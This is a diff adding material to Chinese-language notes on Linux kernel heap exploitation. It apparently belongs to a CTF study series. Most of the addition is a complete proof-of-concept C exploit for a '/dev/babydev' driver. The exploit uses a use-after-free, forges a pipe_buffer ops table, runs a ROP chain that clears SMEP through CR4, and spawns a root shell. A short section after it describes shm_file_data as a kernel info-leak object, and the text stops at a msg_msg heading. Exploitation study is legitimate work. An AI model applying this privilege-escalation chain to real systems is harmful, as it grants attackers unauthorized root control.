@@ -382,3 +382,143 @@ struct pipe_buffer {
 ```
 
 通过搜索 `anon_pipe_buf_release` 可以定位 `anon_pipe_buf_ops`。
+
+
+poc：
+
+```c
+#include <kernel.h>
+
+
+// hint: 使用全局变量的原因是内联汇编不能使用局部变量
+
+unsigned long mov_rsp_rax = 0xffffffff818855cf;
+unsigned long pop_rsp_ret = 0xffffffff8101ebc5;
+unsigned long pop_rax_ret = 0xffffffff8101c216;
+unsigned long mov_cr4_rax_pop_ret = 0xffffffff8100f034;
+#define swapgs_ret 0xffffffff81885588
+#define iretq 0xffffffff81884177
+#define add_rsp_0x150_ret 0xffffffff812743a5
+unsigned long pop_rdi_ret = 0xffffffff810d238d;
+
+int fd, fd1, fd2;
+unsigned long *rop;
+
+// 全局变量的写法
+// unsigned long fake_ops[4] = {0};
+
+
+int main() {
+    // if (mlock(fake_ops, sizeof(fake_ops)) == -1) {
+    //     perror("mlock failed");
+    //     // 在实际利用中可能需要处理这个错误，或者直接退出
+    //     return -1;
+    // }
+
+
+    save_status();
+    bind_core(0);
+    unsigned long rop_chain[30] = {0};
+    int index = 0;
+    rop_chain[index++] = pop_rax_ret;
+    rop_chain[index++] = 0x6f0;
+    rop_chain[index++] = mov_cr4_rax_pop_ret;
+    rop_chain[index++] = 0;
+    rop_chain[index++] = (unsigned long)get_root;
+    rop_chain[index++] = swapgs_ret;
+    rop_chain[index++] = iretq;
+    rop_chain[index++] = (unsigned long)get_root_shell;
+    rop_chain[index++] = user_cs;
+    rop_chain[index++] = user_rflags;
+    rop_chain[index++] = user_sp;
+    rop_chain[index++] = user_ss;
+    rop = rop_chain;
+
+    fd1 = open("/dev/babydev", 2);
+    fd2 = open("/dev/babydev", 2);
+    ioctl(fd1, 0x10001, 0x400);
+    close(fd1);  // uaf
+
+
+    // getchar();
+    int pipe_fd[2];
+    pipe(pipe_fd);
+
+    // info("fd => {%d}", fd);
+    unsigned long mem[4] = {0, 1, 2, 3};
+    unsigned long test[1000];
+
+
+    // write(pipe_fd[1], rop_chain, 0x1);
+
+
+
+    read(fd2, mem, 0x32);
+    // for (int i = 0; i < 4; ++i) {
+    //     info("0x%llx", mem[i]);
+    // }
+
+    // 局部变量的写法
+    unsigned long fake_ops[4] = {0};
+
+    fake_ops[2] = mov_rsp_rax;
+    fake_ops[0] = pop_rsp_ret;
+    fake_ops[1] = (unsigned long)rop;
+    for (int i = 0; i < 4; ++i) {
+        info("0x%llx", fake_ops[i]);
+    }
+    info("fake_ops => 0x%llx", fake_ops);
+
+
+    mem[2] = (unsigned long)fake_ops;
+    write(fd2, mem, 0x32);
+
+    // getchar();
+    close(pipe_fd[0]);
+    close(pipe_fd[1]);
+    close(fd2);
+    return 0;
+}
+```
+
+### shm_file_data
+
+```c
+    int shmid = shmget(IPC_PRIVATE, 100, 0600);
+    if (shmid == -1) {
+        error("shmget error");
+    }
+    char *shmaddr = shmat(shmid, NULL, 0);
+    if (shmaddr == (void *)-1) {
+        error("shmat error");
+    }
+```
+
+当用户态执行以上代码时，`shmat()` 函数对应的内核态调用过程如下图所示：
+
+![](https://pic1.imgdb.cn/item/68f1b5dac5157e1a887a7d7b.png)
+
+内核中调用 `do_shmat()` 函数，为 `struct shm_file_data` 结构体申请一段内存空间（0x20字节大小）。
+
+```c
+struct shm_file_data {
+	int                        id;                   /*     0     4 */
+	
+	/* XXX 4 bytes hole, try to pack */
+	
+	struct ipc_namespace *     ns;                   /*     8     8 */
+	struct file *              file;                 /*    16     8 */
+	const struct vm_operations_struct  * vm_ops;     /*    24     8 */
+	
+	/* size: 32, cachelines: 1, members: 4 */
+	/* sum members: 28, holes: 1, sum holes: 4 */
+	/* last cacheline: 32 bytes */
+};
+```
+
+这个结构体只能用来打信息泄漏，目前还劫持不了控制流。
+
+
+### msg_msg
+
+
